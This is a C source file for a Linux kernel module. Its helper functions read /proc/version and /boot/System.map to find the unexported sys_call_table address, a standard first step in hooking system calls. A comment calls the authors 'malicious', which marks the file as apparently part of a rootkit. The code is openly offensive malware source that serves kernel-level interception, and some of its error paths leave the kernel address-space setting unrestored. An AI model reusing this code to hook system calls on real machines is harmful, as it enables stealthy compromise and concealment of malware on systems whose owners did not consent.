/*
 * Helper functions to dynamically locate system call table address, since newer
 * versions of Linux no longer export the sys_call_table symbol.
 *
 * SEE: https://www.tnichols.org/2015/10/19/Hooking-the-Linux-System-Call-Table/
 */
#include <asm/uaccess.h>
#include <linux/fs.h>
#include <linux/module.h>
#include <linux/slab.h>

#include "util.h"

int find_sys_call_table(char *kern_ver, unsigned long long **sys_call_table) {
  char system_map_entry[MAX_VERSION_LEN];
  int i = 0;

  // Holds the /boot/System.map-<version> file name as we build it
  char *filename;
  // Length of the System.map filename, terminating NULL included
  size_t filename_length = strlen(kern_ver) + strlen(BOOT_PATH) + 1;

  // This will point to our /boot/System.map-<version> file
  struct file *f = NULL;

  mm_segment_t oldfs;

  oldfs = get_fs();
  set_fs(KERNEL_DS);

  printk(KERN_EMERG "Kernel version: %s\n", kern_ver);

  filename = kmalloc(filename_length, GFP_KERNEL);
  if (filename == NULL) {
    printk(KERN_EMERG
           "kmalloc failed on System.map-<version> filename allocation");
    return -1;
  }

  // Zero out memory to be safe
  memset(filename, 0, filename_length);

  // Construct our /boot/System.map-<version> file name
  strncpy(filename, BOOT_PATH, strlen(BOOT_PATH));
  strncat(filename, kern_ver, strlen(kern_ver));

  // Open the System.map file for reading
  f = filp_open(filename, O_RDONLY, 0);
  if (IS_ERR(f) || (f == NULL)) {
    printk(KERN_EMERG "Error opening System.map-<version> file: %s\n",
           filename);
    return -1;
  }

  memset(system_map_entry, 0, MAX_VERSION_LEN);

  /*
   * Read one byte at a time from the file until we either max out
   * out our buffer or read an entire line.
   */
  while (vfs_read(f, system_map_entry + i, 1, &f->f_pos) == 1) {
    /*
     * If we've read an entire line or maxed out our buffer,
     * check to see if we've just read the sys_call_table entry.
     */
    if (system_map_entry[i] == '\n' || i == MAX_VERSION_LEN) {
      // Reset the "column"/"character" counter for the row
      i = 0;

      if (strstr(system_map_entry, "sys_call_table") != NULL) {
        char *sys_string;
        char *system_map_entry_ptr = system_map_entry;

        sys_string = kmalloc(MAX_VERSION_LEN, GFP_KERNEL);
        if (sys_string == NULL) {
          filp_close(f, 0);
          set_fs(oldfs);

          kfree(filename);

          return -1;
        }

        memset(sys_string, 0, MAX_VERSION_LEN);

        strncpy(sys_string, strsep(&system_map_entry_ptr, " "),
                MAX_VERSION_LEN);

        unsigned long long syscall_table = 0;

        kstrtoull(sys_string, 16, &syscall_table);
        *sys_call_table = syscall_table;
        printk(KERN_ALERT "syscall_table retrieved\n");
        printk(KERN_ALERT "syscall_table pointer %p\nsyscall_table value %x\n", sys_call_table, *sys_call_table);

        kfree(sys_string);

        break;
      }

      memset(system_map_entry, 0, MAX_VERSION_LEN);
      continue;
    }

    i++;
  }

  filp_close(f, 0);
  set_fs(oldfs);

  kfree(filename);

  printk(KERN_EMERG "deallocated memory freed\n");

  return 0;
}

/*
 * We have to pass in a pointer to a buffer to store the parsed
 * version information in. If we declare a pointer to the
 * parsed version info on the stack of this function, the
 * pointer will disappear when the function ends and the
 * stack frame is removed.
 */
char *acquire_kernel_version(char *buf) {
  struct file *proc_version;
  char *kernel_version;

  /*
   * We use this to store the userspace perspective of the filesystem
   * so we can switch back to it after we are done reading the file
   * into kernel memory
   */
  mm_segment_t oldfs;

  /*
   * Standard trick for reading a file into kernel space
   * This is very bad practice. We're only doing it here because
   * we're malicious and don't give a damn about best practices.
   */
  oldfs = get_fs();
  set_fs(KERNEL_DS);

  // Open the version file in the /proc virtual filesystem
  proc_version = filp_open(PROC_V, O_RDONLY, 0);
  if (IS_ERR(proc_version) || (proc_version == NULL)) {
    return NULL;
  }

  // Zero out memory just to be safe
  memset(buf, 0, MAX_VERSION_LEN);

  // Read version info from /proc virtual filesystem
  vfs_read(proc_version, buf, MAX_VERSION_LEN, &(proc_version->f_pos));

  // Extract the third field from the full version string
  kernel_version = strsep(&buf, " ");
  kernel_version = strsep(&buf, " ");
  kernel_version = strsep(&buf, " ");

  filp_close(proc_version, 0);

  // Switch filesystem context back to user space mode
  set_fs(oldfs);

  return kernel_version;
}
